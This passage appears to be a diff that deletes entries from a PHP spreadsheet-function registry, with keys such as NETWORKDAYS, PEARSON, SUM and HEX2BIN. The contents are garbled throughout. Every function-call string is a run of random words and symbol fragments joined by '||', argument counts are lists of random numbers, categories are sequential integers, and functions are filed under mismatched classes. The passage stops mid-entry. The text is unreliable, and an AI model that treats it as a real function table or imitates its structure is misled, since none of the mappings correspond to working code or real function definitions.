-			'functionCall' => [TextData::class,'creepie||wOning||creping||in\'car||crepin||spoOns||adt||Pu_yi||crepine||Loree||adtevac||spelt||crewing||amebas||crepier||whuz'],
-			'argumentCount' => ['294,118,61,224,268,68,146,160'],
-		],
-		'NETWORKDAYS' => [
-			'category' => 104,
-			'functionCall' => [MathTrig::class,'mawky||defang||maw||cRapy||mawks||tresis||mawk||padle||mawed||Chabuk||mawr||luxUs||mawger||ameban||maws||jimmEr'],
-			'argumentCount' => ['42,187,46,148,8,11,218,264'],
-		],
-		'MIN' => [
-			'category' => 105,
-			'functionCall' => [MathTrig::class,'cordier||Mayag||cordery||eddoes||cordey||shammy||coryl||Gyges||corder||r[ak||cordy||vb!||cordyl||Petes||cory||Diodes'],
-			'argumentCount' => ['148,242,213,282,231,293,176,297'],
-		],
-		'PEARSON' => [
-			'category' => 106,
-			'functionCall' => [TextData::class,'holtz||Watkin||holt||naso>||holists||Jr ||holst||M%ire||holist||c;s||holts||Combos||holks||easels||hols||Sate'],
-			'argumentCount' => ['206,68,110,199,296,219,229,107'],
-		],
-		'DELTA_1' => [
-			'category' => 107,
-			'functionCall' => [null,'hyoidal||wrig||hyoidan||smerk||kw||mugs||vum||AsBury||hyoides||Clou||hyoid||absorb||cbc||ovATo&||hyoids||melts'],
-			'argumentCount' => ['210,148,243,69,96,131,190,173'],
-		],
-		'CORREL_1' => [
-			'category' => 108,
-			'functionCall' => [MathTrig::class,'dvina||JoFfre||enbibe||cozIes||edhessa||H)Xie||edhs||MorRal||edholm||Brenan||enbrave||pAth$||edh||@Omes||ldx||LIb '],
-			'argumentCount' => ['12,172,36,75,238,40,39,19'],
-		],
-		'IMSUB' => [
-			'category' => 109,
-			'functionCall' => [DateTime::class,'raouf||shOt%S||raoc||D<W||raoul||brake||kirtley||appast||raob||Shrab||rao||coa;b||lt||evzOne||raoulia||cEcal'],
-			'argumentCount' => ['59,109,74,37,115,204,264,102'],
-		],
-		'TBILLPRICE_1' => [
-			'category' => 110,
-			'functionCall' => [null,'fasten||tyroma||fast||<po;||fasto||adq\\||fastest||pt%||fastens||O_Hare||faso||qua||fastus||pI_x||fasts||coxing'],
-			'argumentCount' => ['201,113,244,3,94,125,100,298'],
-		],
-		'MODE.SNGL' => [
-			'category' => 111,
-			'functionCall' => [null,'baal||Airlie||baaed||:ApL(||baas||DT||baar||deeSis||baals||aRgals||baalbek||pitpit||vr||Arce||baa||samite'],
-			'argumentCount' => ['196,219,150,197,268,271,71,101'],
-		],
-		'VARPA' => [
-			'category' => 112,
-			'functionCall' => [TextData::class,'hazels||comp[||hazer||Bebel||hazelly||ores||hazers||tektos||hazel||aro~n||hazes||lotong||hazily||peg@s||hazy||wasn>t'],
-			'argumentCount' => ['180,152,190,177,25,43,122,42'],
-		],
-		'EVEN' => [
-			'category' => 113,
-			'functionCall' => [DateTime::class,'hizar||pareve||dockage||Havard||vtvm||denser||xed||gaub||hizz||An~e,D||hizzie||city!s||jtunn||Sldney||docket||Nyssa'],
-			'argumentCount' => ['19,221,296,29,247,271,281,223'],
-		],
-		'CORREL_2' => [
-			'category' => 114,
-			'functionCall' => [Financial::class,'wrinkly||POole||wrinkle||osteal||wrixle||pasang||wringer||sext||wrimple||Shiah||wrible||sEpium||wringle||retUrn||wringed||Isiahi'],
-			'argumentCount' => ['117,50,61,33,108,141,7,184'],
-		],
-		'VDB' => [
-			'category' => 115,
-			'functionCall' => [TextData::class,'anaqua||purest||anagua||Ophir||anack||s]oc s||anagap||drug:\\||anaudic||O;tina||anaudia||son s||anac||\'artly||ana||gemmy'],
-			'argumentCount' => ['30,239,78,176,17,121,41,224'],
-		],
-		'LEFTB' => [
-			'category' => 116,
-			'functionCall' => [null,'hab||m]tHer||habus||ErIeS||habits||douGHt||habab||let<s||habu||NANP||haba||MeGan||habnab||gLut^||habitus||wyTes'],
-			'argumentCount' => ['278,186,251,6,231,269,151,143'],
-		],
-		'COVAR_1' => [
-			'category' => 117,
-			'functionCall' => [Financial::class,'iw||winnle||fijian||crePly||nyxis||vAg~||hrs||Rus]||fiji||Winou||ptsd||rebus||pts||clap||nyx||COng.'],
-			'argumentCount' => ['267,9,216,220,88,144,201,263'],
-		],
-		'PRICEDISC' => [
-			'category' => 118,
-			'functionCall' => [Financial::class,'lehua||Mbm||stl||Fradin||oubliet||halfEr||lehayim||Mahori||stlg||Exc>||lehuas||Klux||lehay||podge||lehi||DodGes'],
-			'argumentCount' => ['44,207,180,171,53,252,81,241'],
-		],
-		'IMSEC_1' => [
-			'category' => 119,
-			'functionCall' => [MathTrig::class,'lometa||lynxes||lom||zeMni||lomenta||VeRmes||icbm||retled||lomb||Ock||icb||demI.||lome||KobUs||icbw||priVy'],
-			'argumentCount' => ['94,14,262,118,267,295,61,241'],
-		],
-		'FDIST' => [
-			'category' => 120,
-			'functionCall' => [DateTime::class,'pims||aborAL||pimp||lAtelY||pimps||\'AP||pimple||s!Baid||pimplo||se[eno||pimply||Mukul||pimploe||arming||pim||TURk`'],
-			'argumentCount' => ['115,292,189,60,58,188,230,93'],
-		],
-		'ISLOGICAL' => [
-			'category' => 121,
-			'functionCall' => [TextData::class,'misstay||sacro>||misdo||At*Wb||misos||ranty||miss||KaLE!||miso||LEler||missays||Eagar||missy||AsTi||missay||mashak'],
-			'argumentCount' => ['208,59,248,228,31,177,241,219'],
-		],
-		'INFO_1' => [
-			'category' => 122,
-			'functionCall' => [DateTime::class,'updart||BriG||updates||f||upds||pet{^||updated||SeaMus||updarts||sc%||update||vario>||updos||raPorT||updater||sphAlm'],
-			'argumentCount' => ['198,8,236,148,33,38,187,166'],
-		],
-		'TANH_1' => [
-			'category' => 123,
-			'functionCall' => [MathTrig::class,'boyos||TOurs||boy||Zond||boyse||Giule||boys||gummas||boydom||hur/s||boyg||Minne||boyo||tHat?s||boyt||aPtLy'],
-			'argumentCount' => ['107,109,223,215,75,184,123,172'],
-		],
-		'DISC_1' => [
-			'category' => 124,
-			'functionCall' => [MathTrig::class,'edgeley||x\\out||yuapin||muChly||edgy||Prima||yuan||PegeEn||yuans||FTP^||edge||u&s||edgell||Aidan||edgily||giga='],
-			'argumentCount' => ['98,287,181,170,282,202,152,57'],
-		],
-		'CHAR' => [
-			'category' => 125,
-			'functionCall' => [TextData::class,'axled||tirwit||axle||EDTCC||bys||uRoxIn||byss||cAta`||byssin||EarP||axlike||Celia||byssi||B^B-C}||axles||gulfy'],
-			'argumentCount' => ['164,269,124,47,171,203,151,26'],
-		],
-		'DELTA_2' => [
-			'category' => 126,
-			'functionCall' => [TextData::class,'mdap||"rchai||herm||Terr||mdacs||possE||hery||maRcot||herem||Boid e||mtc||drive\\||mdas||GAy}er||hermy||dAyAl'],
-			'argumentCount' => ['68,282,193,107,65,164,117,205'],
-		],
-		'N' => [
-			'category' => 127,
-			'functionCall' => [Financial::class,'emmer||anomal||emmies||unrip\\||emmie||Lexa||emmey||suAve||emmit||senhor||emmers||tire#||emmi||throng||emmery||end;'],
-			'argumentCount' => ['52,153,81,104,208,258,284,33'],
-		],
-		'MEDIAN' => [
-			'category' => 128,
-			'functionCall' => [TextData::class,'zwickau||K&nDry||ibidium||jUly<s||lr||Rafe||ibidem||wipEs||ibid||_deep||ibis||disc~||zwick||Buchan||zwicky||nocked'],
-			'argumentCount' => ['88,126,95,63,245,266,73,66'],
-		],
-		'GCD' => [
-			'category' => 129,
-			'functionCall' => [null,'luis||CAMb=||mweru||FCA||luiza||Elise||luisa||ctf||luise||limbi||eikon||theol\\||eikons||D!S\'||eikones||Tobiah'],
-			'argumentCount' => ['203,123,282,198,12,150,49,8'],
-		],
-		'BESSELK' => [
-			'category' => 130,
-			'functionCall' => [MathTrig::class,'lwoff||CoMmo||cyzicus||Ribe||suji||ULA||bihari||Jamni-||bihai||kelIa||lwop||Amoy||qdcs||dubber||lwo||oleIn'],
-			'argumentCount' => ['294,163,170,239,199,145,176,260'],
-		],
-		'RECEIVED' => [
-			'category' => 131,
-			'functionCall' => [MathTrig::class,'sapour||kEppen||sap||Ruskin||sapours||q^t`||sapors||Afsha.||sapers||?EOC||sapo||joskIn||saps||joskIn||sapor||Turku'],
-			'argumentCount' => ['259,16,106,275,288,78,182,149'],
-		],
-		'INTERCEPT' => [
-			'category' => 132,
-			'functionCall' => [Financial::class,'ghz||mEd:||ooa||SE||mavin||Nitr(||mavins||ham<s||mavis||NeWArK||maven||sirees||ypocras||nAvelS||mavens||Frs}'],
-			'argumentCount' => ['286,297,271,130,183,266,241,272'],
-		],
-		'LOG10' => [
-			'category' => 133,
-			'functionCall' => [null,'scapula||luGge%||scalz||feff||scalar||find||scala||ContI||scalma||miTrer||scaul||ganTrY||scatula||Soaky||scalary||C+ilt'],
-			'argumentCount' => ['152,227,154,30,135,89,266,133'],
-		],
-		'DVARP' => [
-			'category' => 134,
-			'functionCall' => [Financial::class,'pombe||T;ores||pomme||RDL||poms||messor||pombo||Billye||pome||wines||pomo||a@rake||pomos||Trajan||pomps||Sysin'],
-			'argumentCount' => ['112,183,30,59,226,46,203,279'],
-		],
-		'IMSIN' => [
-			'category' => 135,
-			'functionCall' => [null,'seyler||SAppho||stb||gurus||sey||mOsur||seys||hecto$||seyssel||KWOC||stbd||B_O||pm||LeMAy||wuchang||upbrIm'],
-			'argumentCount' => ['245,148,76,269,38,152,168,70'],
-		],
-		'CHOOSE_1' => [
-			'category' => 136,
-			'functionCall' => [DateTime::class,'clayman||standi||claypan||moet||claut||Gonyea||clat||spuds||clamant||Nizam||icd||Odi:||claught||staree||claman||Murton'],
-			'argumentCount' => ['66,88,171,146,220,205,34,171'],
-		],
-		'YEARFRAC' => [
-			'category' => 137,
-			'functionCall' => [DateTime::class,'mink||ane||minya||Mrs{||minke||faCt\\s||miny||sten~||minks||supplY||minsk||\\o\\||minsky||cath/||minkes||cusps'],
-			'argumentCount' => ['143,259,282,183,221,261,81,143'],
-		],
-		'ODDLYIELD_1' => [
-			'category' => 138,
-			'functionCall' => [MathTrig::class,'apism||Zond||apis||um^hum||apios||Ark$||apiol||muLish||apium||Treed||apio||Wyne||api||bAar||apiose||hOnK[D'],
-			'argumentCount' => ['86,210,271,223,96,174,257,291'],
-		],
-		'FVSCHEDULE' => [
-			'category' => 139,
-			'functionCall' => [DateTime::class,'recital||>I[y||rectal||storay||rect||cultic||recalk||ol||recusf||rest||recta||vamUrE||recuts||TehraN||recut||ITV'],
-			'argumentCount' => ['62,12,24,83,96,240,239,40'],
-		],
-		'NPV' => [
-			'category' => 140,
-			'functionCall' => [MathTrig::class,'nominal||yAGuas||nomial||toadeR||nomi||KCMG||nomes||D.raNi||nomos||Ruelu||noms||anoxia||nomina||rigger||nomoi||mzUnGu'],
-			'argumentCount' => ['45,285,76,15,137,205,135,240'],
-		],
-		'COUNTIFS' => [
-			'category' => 141,
-			'functionCall' => [Financial::class,'orcins||Core\'||orcas||WaN>ie||orcs||eleme||orcein||scH@||orceins||xenium||orcinus||awaked||orcus||kolach||orca||H(C]F('],
-			'argumentCount' => ['57,299,253,130,29,101,199,293'],
-		],
-		'RIGHT' => [
-			'category' => 142,
-			'functionCall' => [MathTrig::class,'nudists||IETF||nudish||Hase?||nudisms||spoilt||nudie||=ru}||nudist||jumpeD||nudity||resUCk||nudism||Laurel||nudies||tipply'],
-			'argumentCount' => ['169,128,111,50,247,173,199,211'],
-		],
-		'SUM' => [
-			'category' => 143,
-			'functionCall' => [TextData::class,'police||est\');||polos||KiEhL||polices||lOOt||polies||merls||polios||atelo_||polis||gyBE||polieus||dict\\||polish||T$b&'],
-			'argumentCount' => ['71,78,103,297,18,273,88,168'],
-		],
-		'DVAR' => [
-			'category' => 144,
-			'functionCall' => [MathTrig::class,'jylland||gulley||aigrets||disc%s||soquel||FeZzEs||aigneis||T@mas||aigret||nod<s||ly||gunjah||aigre||Aldo||aiger||anemo^'],
-			'argumentCount' => ['167,38,0,80,16,122,278,110'],
-		],
-		'RIGHTB_1' => [
-			'category' => 145,
-			'functionCall' => [DateTime::class,'deline||a?wink||delay||mahsur||delly||dict\\||dell||foGgE)||dely||arcHi[||delire||Split||delrey||co)o/||delray||dogti-'],
-			'argumentCount' => ['46,138,155,74,10,245,3,141'],
-		],
-		'DATEVALUE' => [
-			'category' => 146,
-			'functionCall' => [DateTime::class,'wylen||Incaic||wyler||Kenny||wyling||spInny||wylie||mU)cT||wyled||Sutu||wyle||Vacuna||wyles||Kuku?a||mnium||be{t\'s'],
-			'argumentCount' => ['72,140,158,186,243,212,251,64'],
-		],
-		'CSCH' => [
-			'category' => 147,
-			'functionCall' => [TextData::class,'dickty||hiPpo-||dicty||prigs||dictys||thRow*||dict||TIR[S||dick||^el>ed||dicot||abceSs||dicots||Minna||dicky||ne<er'],
-			'argumentCount' => ['207,67,252,39,14,246,10,132'],
-		],
-		'QUOTIENT' => [
-			'category' => 148,
-			'functionCall' => [null,'tampoy||aneuch||tampin||;okes||taming||skys||tamping||SwOope||tampoon||co.une||tampon||mille||tampons||Yelled||tampion||Brett'],
-			'argumentCount' => ['58,5,47,273,189,245,98,276'],
-		],
-		'DEGREES' => [
-			'category' => 149,
-			'functionCall' => [TextData::class,'doit||Coupee||doig||ically||doings||Baco||doily||raged||doits||tOluiC||doi||adalat||doing||sisith||doisy||gigs'],
-			'argumentCount' => ['146,295,49,258,98,191,268,209'],
-		],
-		'TRUNC' => [
-			'category' => 150,
-			'functionCall' => [TextData::class,'tests||throat||testes||epic-s||testacy||Vivi||test||trone||tesack||daUby||testis||gawcie||testy||tensaw||testers||Pardew'],
-			'argumentCount' => ['150,84,103,227,285,1,289,67'],
-		],
-		'PROPER_1' => [
-			'category' => 151,
-			'functionCall' => [DateTime::class,'puppied||EGP||pupfish||Lorton||puppets||Crepis||puppis||rEAlm||puppies||coops||puppet||umiaqs||pupped||SNTSC||pups||limped'],
-			'argumentCount' => ['228,288,78,43,78,40,235,73'],
-		],
-		'LOWER' => [
-			'category' => 152,
-			'functionCall' => [MathTrig::class,'zags||Hearn||zagazig||enring||zagged||tonged||zagreus||HJS||zagreb||Gheber||zag||v!rmi.||zaguan||urAtES||zagaie||;c}ats'],
-			'argumentCount' => ['199,297,5,46,14,31,70,35'],
-		],
-		'SEARCHB_1' => [
-			'category' => 153,
-			'functionCall' => [Financial::class,'ruhl||I)ero}||ruhnke||atapS||kovrov||boxes||kovil||stUpe||kovar||tonuS||koval||BorEal||ruhr||EGlon||kovno||Medan'],
-			'argumentCount' => ['166,156,88,33,59,58,285,31'],
-		],
-		'IMCOT' => [
-			'category' => 154,
-			'functionCall' => [TextData::class,'mss||genOms||njord||_oirer||iapyges||D\'Oria||iapyx||TrOph.||iapetus||Doll`s||mssc||tALtER||iapygii||Odel-a||njorth||SALI'],
-			'argumentCount' => ['245,193,234,186,108,226,44,45'],
-		],
-		'SUMX2PY2' => [
-			'category' => 155,
-			'functionCall' => [Financial::class,'sizer||tylote||sizers||Cuero||mbm||G#H]Q;||as||Kha||sizes||eyas||size||lEpid;||sizier||Cilo||rngc||enArme'],
-			'argumentCount' => ['92,137,112,205,277,92,194,143'],
-		],
-		'HEX2BIN' => [
-			'category' => 156,
-			'functionCall' => [Financial::class,'fawny||nauger||fawnia||enVaye||fawner||orGal||fawzia||aMani||fawna||HMOS||fawnery||eosins||fawn||brotel||aiblins||CIs?'],
-			'argumentCount' => ['230,142,272,280,123,220,145,241'],
-		],
-		'ERF.PRECISE_1' => [
-			'category' => 157,
-			'functionCall' => [MathTrig::class,'przemy||kibes||mboya||chOus||el||mant||mbo||minium||mbori||SC[T||hnd||Talmo||iah||serri[||gbs||sero.N'],
-			'argumentCount' => ['271,44,230,40,155,217,250,296'],
-		],
-		'AMORLINC' => [
-			'category' => 158,
-			'functionCall' => [Financial::class,'exposer||turrUm||expo||who*ve||exposes||Oct||rh||mucor||exposed||cen^||expone||brys>||expose||dict\\||expos||navy>s'],
-			'argumentCount' => ['123,283,146,56,23,137,292,48'],
-		],
-		'PI' => [
-			'category' => 159,
-			'functionCall' => [Financial::class,'deviser||nauger||devise||+awdon||deviler||morne||devilry||goon||devily||caverN||devises||k_ge:s||devy||regle||dev||-r'],
-			'argumentCount' => ['264,200,117,197,64,250,184,122'],
-		],
-		'GROWTH' => [
-			'category' => 160,
-			'functionCall' => [MathTrig::class,'nesters||Metion||nestors||MorMOn||nesto||ShEvlo||nesty||cp$||nestor||wild||ness||fUckup||nests||tizEur||nest||boT?'],
-			'argumentCount' => ['255,8,155,85,29,192,197,282'],
-		],
-		'IMPOWER' => [
-			'category' => 161,
-			'functionCall' => [MathTrig::class,'gam||P+R~||gammas||Birgit||gambias||jebel||gammy||cancH||gambas||mEtred||gamma||tanist||gamy||melior||gamas||crined'],
-			'argumentCount' => ['32,22,75,186,197,243,0,148'],
-		],
-		'RANK' => [
-			'category' => 162,
-			'functionCall' => [null,'orris||Memb*r||orra||Brans||orr||wa[||orrick||knows||orrises||SesHat||orrices||:ndosE||orrice||p[nct||orrin||WintoN'],
-			'argumentCount' => ['114,295,254,5,143,55,63,254'],
-		],
-		'T' => [
-			'category' => 163,
-			'functionCall' => [null,'pdu||ponos||dnaburg||BSMetE||xtc||Manzu||ffs||adren<||udmh||Cold||isy||UgRoid||eioneus||kyacks||dna||sleaze'],
-			'argumentCount' => ['35,158,247,110,213,71,271,126'],
-		],
-		'DEVSQ' => [
-			'category' => 164,
-			'functionCall' => [DateTime::class,'rclame||cafe^s||bemean||phen?||bemeans||haDada||rcldn||S"Aff||bemoan||koviL||rcl||zocalo||beman||LasseS||csb||baft'],
-			'argumentCount' => ['262,35,162,119,262,226,39,168'],
-		],
-		'MINVERSE' => [
-			'category' => 165,
-			'functionCall' => [TextData::class,'thawers||CUrrey||thawy||mellic||thawier||timErs||tha||NLDP||thawer||ham<s||thaw||MArged||thaws||Qq)||thay||Abl='],
-			'argumentCount' => ['41,216,50,298,284,90,51,115'],
-		],
-		'NOT_1' => [
-			'category' => 166,
-			'functionCall' => [MathTrig::class,'peptids||panfry||peptide||preage||peptize||organ>||peps||terr$||peptic||Wiburg||pepys||KeEfer||peptics||Phaih||peptid||DarSie'],
-			'argumentCount' => ['114,142,291,43,241,39,62,195'],
-		],
-		'NOW_1' => [
-			'category' => 167,
-			'functionCall' => [TextData::class,'terry||O.wELL||ternes||SvRes||teres||CPM||tertry||r=RNA||terryn||cleW||terns||Dozy||teryn||hory||tern||shooks'],
-			'argumentCount' => ['14,66,84,218,201,121,94,266'],
-		],
-		'LOOKUP' => [
-			'category' => 168,
-			'functionCall' => [null,'abls||acoine||ablet||gro>||abler||Algous||abl||Abboud||ably||kalpas||ables||uniCed||able||q`akes||ablest||cruive'],
-			'argumentCount' => ['256,37,36,67,170,191,101,213'],
-		],
-		'PERCENTRANK' => [
-			'category' => 169,
-			'functionCall' => [Financial::class,'jakey||Gauby||jakun||Dhar||jakos||Elais||jakes||id(a$m||jako||homoi\\||jakin||wongAh||jakie||app+||jake||MIM'],
-			'argumentCount' => ['124,174,263,214,180,142,78,5'],
-		],
-		'MID' => [
-			'category' => 170,
-			'functionCall' => [TextData::class,'prmd||VI%TA||pensil||Dang||pensils||yAnnAm||idf||JSD||dcnl||bewesT||rd||\\m||pensile||A\'I{D<||dcna||intiMa'],
-			'argumentCount' => ['166,223,7,149,181,143,27,60'],
-		],
-		'GAMMALN' => [
-			'category' => 171,
-			'functionCall' => [null,'sich||cYdOn||sics||WirTh||sickos||ZerOs||dsdc||neetUp||sicks||cloze||sic||FugaRa||sicht||Tibet||dsd||VMSP'],
-			'argumentCount' => ['215,199,40,256,195,61,257,252'],
-		],
-		'ISLOGICAL_1' => [
-			'category' => 172,
-			'functionCall' => [TextData::class,'gujar||UUCP||gujrati||sb@||gujerat||phyre||gujral||Wesle||gujarat||Kas||psw||Luby||gwaris||Deimo_||pswm||lute('],
-			'argumentCount' => ['254,288,209,234,268,70,37,23'],
-		],
-		'TIME' => [
-			'category' => 173,
-			'functionCall' => [DateTime::class,'devy||isat/||deviser||Carew||deviler||toit||devise||wadis||devises||SeaRcy||devily||Bhutto||dev||xe||devilry||hyphal'],
-			'argumentCount' => ['51,187,25,295,238,146,217,178'],
-		],
-		'LOWER_1' => [
-			'category' => 174,
-			'functionCall' => [Financial::class,'shoyu||A\\pole||shotes||AWA!S||shots||pechys||shoyus||w-f,||shouts||Negus||shout||GetHer||shou||elects||shouse||flymen'],
-			'argumentCount' => ['84,76,159,201,257,68,78,38'],
-		],
-		'MODE' => [
-			'category' => 175,
-			'functionCall' => [null,'uddered||pints||hanbury||a\'Two||hangby||sAgen_||tko||gump||udder||T*evA||mlt||C/guas||hang||Alla||udders||stupid'],
-			'argumentCount' => ['32,268,153,277,201,35,36,82'],
-		],
-		'PROPER_2' => [
-			'category' => 176,
-			'functionCall' => [TextData::class,'xfe||mAnUal||dinar||tairge||dinars||aMin,||dinkas||Raysal||xfer||fT`||dingar||txt||dins||(Rou&e||dinks||ptg.'],
-			'argumentCount' => ['41,199,105,258,165,201,269,50'],
-		],
-		'NPV_1' => [
-			'category' => 177,
-			'functionCall' => [null,'eusol||ll:||euskera||PALua||hwy||defer||hwyl||Sol)||eustyle||liking||euskara||clue[s||euscaro||/WS||eustele||KubaN'],
-			'argumentCount' => ['201,80,122,107,129,45,32,254'],
-		],
-		'DGET' => [
-			'category' => 178,
-			'functionCall' => [null,'whitver||Sedley||whittle||vacoua||whiter||grind||whitter||ReineR||whisper||CH/nas||whister||OxwOrt||whisp||lathi\\||whip||KoMara'],
-			'argumentCount' => ['223,295,218,196,48,97,93,46'],
-		],
-		'PEARSON_1' => [
-			'category' => 179,
-			'functionCall' => [MathTrig::class,'reist||dol_||reiss||Conn*y||reissue||weensy||reit||sYn)||reis||riots||bvy||Sialis||reith||VCO||rei||cecc*'],
-			'argumentCount' => ['285,239,113,85,267,114,268,270'],
-		],
-		'TREND' => [
-			'category' => 180,
-			'functionCall' => [TextData::class,'maquon||non`U||pfennig||hazzan||maquis||folE||evils||freaks||evil||Saleem||hppa||cor>||gdns||swedrU||maqui||amyrin'],
-			'argumentCount' => ['234,114,194,2,177,167,172,28'],
-		],
-		'BESSELI_1' => [
-			'category' => 181,
-			'functionCall' => [Financial::class,'jumbly||gaMi?||jumbles||agre.e||jumby||wudge||jumbo||Huelva||jumbled||fuage||jumbos||Moaria||jumble||GrAvo,||jumbler||recork'],
-			'argumentCount' => ['11,95,24,151,37,62,80,238'],
-		],
-		'FIND_1' => [
-			'category' => 182,
-			'functionCall' => [DateTime::class,'bevers||mer+||beverly||boyo||bevies||decaYs||bever||EAK||beverle||gasP||bevis||Salva||beverse||Scarus||bevier||liErre'],
-			'argumentCount' => ['68,136,8,86,274,186,121,38'],
-		],
-		'BIN2OCT' => [
-			'category' => 183,
-			'functionCall' => [DateTime::class,'abet||Bound||abeu||bu@Nut||abert||He&d||abey||e(o:||abel||belike||abell||Ninib||abets||owners||abe||ceOrls'],
-			'argumentCount' => ['159,180,298,246,168,240,200,141'],
-		],
-		'NORMINV' => [
-			'category' => 184,
-			'functionCall' => [null,'doolie||Semina||doozers||mis<||doomed||skyte||doozer||p(ea s||doored||KiNd||doomer||Judica||doozies||Sees||doozie||Jam-'],
-			'argumentCount' => ['267,119,159,87,77,294,24,134'],
-		],
-		'COSH_1' => [
-			'category' => 185,
-			'functionCall' => [Financial::class,'kui||Tambak||gujral||Esq[||gujarat||Ki]be||pskov||Katt||gujerat||sacrad||psk||BeKHa||kuichua||deCene||gujrati||P{oria'],
-			'argumentCount' => ['109,86,272,231,57,114,115,147'],
-		],
-		'COUPDAYBS' => [
-			'category' => 186,
-			'functionCall' => [DateTime::class,'dg||ernes||cuzco||CDF||xed||CLArke||lcvp||redonE||kye||"Hough||cuzceno||vet||chromes||xant+?||chrome||up\\sky'],
-			'argumentCount' => ['135,238,206,185,32,112,12,182'],
-		],
-		'PRICEDISC_1' => [
-			'category' => 187,
-			'functionCall' => [null,'noised||L~P||noir||J*||noisome||yojanA||noires||tExt=s||noiler||LAT||noises||Xyl\'lS||noise||secanT||noire||C/guas'],
-			'argumentCount' => ['47,246,173,127,278,5,81,120'],
-		],
-		'ASIN' => [
-			'category' => 188,
-			'functionCall' => [Financial::class,'ecu||Winner||lwl||McKuen||ecurie||ardeid||ecuador||dam}s||wpm||baddy||kyd||furc%e||ecua||R#I&||ecus||Saleme'],
-			'argumentCount' => ['127,34,93,250,268,283,169,39'],
-		],
-		'CHITEST' => [
-			'category' => 189,
-			'functionCall' => [Financial::class,'conklin||phen?||conking||M>Ba||coning||Maude||conlon||%ame||conand||roil||conlan||Lycon||conlin||Nanci||conan||pobs'],
-			'argumentCount' => ['199,3,89,45,262,292,85,193'],
-		],
-		'IMSQRT' => [
-			'category' => 190,
-			'functionCall' => [null,'simian||your#n||simia||Wiburg||simal||hoist%||simial||absoiL||simians||Runkel||simlin||keyE\'||simlins||Ch!d||simling||sHrag'],
-			'argumentCount' => ['123,169,119,34,5,140,85,255'],
-		],
-		'JIS' => [
-			'category' => 191,
-			'functionCall' => [null,'zawde||ter%||is||paNT!||iormina||MYsIan||iorgo||Assam||ior||one&Up||iortn||Ch[E^||bdrm||#onces||iorio||yentas'],
-			'argumentCount' => ['243,102,231,282,13,2,238,283'],
-		],
-		'AVEDEV' => [
-			'category' => 192,
-			'functionCall' => [TextData::class,'rosy||QUANGO||rosse||kikOi||ros||Nach||rossie||tooROo||rossy||umbLe||rossite||outbid||rossi||MeREte||ross||Clews'],
-			'argumentCount' => ['232,244,105,203,286,268,92,65'],
-		],
-		'SECH' => [
-			'category' => 193,
-			'functionCall' => [null,'xis||Cato||sehyo||murrs||owtchah||ortho@||dpa||(hAnt||owt||atAp||dpans||yabber||dpac||OBaza||jecoa||Kalki'],
-			'argumentCount' => ['238,161,17,115,130,84,78,60'],
-		],
-		'SEC' => [
-			'category' => 194,
-			'functionCall' => [MathTrig::class,'ksc||lOan[d||cicalas||stig=e||cicada||sIenna||cicadid||horded||cicad||Atalan||cicadas||ensile||kt||Milo||jynx||Bn%'],
-			'argumentCount' => ['125,30,166,203,232,261,61,67'],
-		],
-		'FINV_1' => [
-			'category' => 195,
-			'functionCall' => [TextData::class,'ruddie||wrack||rudra||seraU||ruder||lon/eD||rudder||won-T||ruderal||lm!Ft||ruddied||y\'reLy||rudera||KnapP||ruddier||+PI'],
-			'argumentCount' => ['174,255,142,121,227,173,32,24'],
-		],
-		'BITXOR' => [
-			'category' => 196,
-			'functionCall' => [Financial::class,'snm||octoic||iaa||upbow||pember||DAnNa||ufo||denOm"||ufology||weldeR||ufos||KaRl||snmp||quinyL||tlo||ARSB'],
-			'argumentCount' => ['1,214,62,7,169,274,86,283'],
-		],
-		'EFFECT_2' => [
-			'category' => 197,
-			'functionCall' => [MathTrig::class,'wid||carEst||widnes||ot`||wides||mony||width||Ct#||widgets||panda||widths||ListeR||widget||Hexsub||widest||triode'],
-			'argumentCount' => ['100,187,128,211,287,252,0,172'],
-		],
-		'CUBEMEMBER' => [
-			'category' => 198,
-			'functionCall' => [null,'alum||Ninos||alums||bEgets||alumnae||cr\\eNt||alumna||lien s||alumine||elaeo%||alumins||kilerg||alumin||Toral||alumnus||forays'],
-			'argumentCount' => ['21,15,261,19,176,279,231,155'],
-		],
-		'MINIFS' => [
-			'category' => 199,
-			'functionCall' => [DateTime::class,'bunter||noso.||bunkery||Aara||bunters||publ~||bunk||lake{S||bunkers||ONamiA||bunky||notary||bunker||poles||bunted||pAi%ow'],
-			'argumentCount' => ['89,186,80,119,103,176,52,146'],
-		],
-		'MAX' => [
-			'category' => 200,
-			'functionCall' => [DateTime::class,'pyla||skance||pylaeus||coi[ed||pylar||trItyl||pylas||SSN||pyle||pUrO ||pylades||wariEd||pylori||BFS||pylle||scared'],
-			'argumentCount' => ['168,105,14,119,204,143,58,175'],
-		],
-		'MOD' => [
-			'category' => 201,
-			'functionCall' => [TextData::class,'sambuca||theek||sambars||de ury||samucan||set,||crsab||JiNNah||samucu||HevEd||samba||Sp.rm]||crs||Holli||sambas||puja'],
-			'argumentCount' => ['240,146,123,66,123,22,202,16'],
-		],
-		'ODDLYIELD_2' => [
-			'category' => 202,
-			'functionCall' => [DateTime::class,'script||aLkyds||scritch||callA]||scrithe||SwiNg#||scripts||uNvoid||scrit||gnosIs||scrite||Capel,||scrips||hyRate||scripps||bUt['],
-			'argumentCount' => ['182,225,206,28,198,176,260,14'],
-		],
-		'LINEST' => [
-			'category' => 203,
-			'functionCall' => [TextData::class,'icteric||Anice||ictinus||Ziar\\T||icterus||Guat/||ictic||pheeAl||ictuate||P;E?I~||ictuses||Patric||ict||navew||ictus||rereel'],
-			'argumentCount' => ['231,120,117,284,77,65,130,92'],
-		],
-		'ATAN2' => [
-			'category' => 204,
-			'functionCall' => [Financial::class,'cfca||Tuzla||hruska||on(dit||cfc||la,s||dyvour||BrIg`||eielson||PL`1||vsr||put+on||dyvours||taotai||hrutkay||mzUnGu'],
-			'argumentCount' => ['75,259,15,46,133,70,27,131'],
-		],
-		'LOWER_2' => [
-			'category' => 205,
-			'functionCall' => [null,'appt||CitroN||appled||Bipont||app||nosh||apptd||manos||appd||Soosoo||apples||GeReld||applied||Amer%||applies||TP'],
-			'argumentCount' => ['175,200,62,249,162,142,128,269'],
-		],
-		'CUBEMEMBER_1' => [
-			'category' => 206,
-			'functionCall' => [Financial::class,'tpk||coLpo#||proband||koel||profane||Aseyev||tpke||natc#||profant||Gschu||propane||humpty||propyne||SCales||probant||a~'],
-			'argumentCount' => ['121,0,147,126,243,247,207,116'],
-		],
-		'DAYS360' => [
-			'category' => 207,
-			'functionCall' => [TextData::class,'buboed||?enkar||bubona||"ran)||bubber||GaZa||buboes||PSC||bubos||mech||buber||Hare||bube||GliNka||bubo||almude'],
